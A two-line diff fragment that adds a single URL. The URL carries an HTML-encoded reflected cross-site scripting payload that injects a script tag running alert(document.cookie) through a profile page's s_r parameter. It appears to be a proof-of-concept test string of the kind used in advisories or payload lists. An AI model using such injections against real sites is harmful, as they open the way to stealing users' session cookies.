@@ -1,0 +1,2 @@
+ http://www.example.com/profile.php?profile_id=568&s_r=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
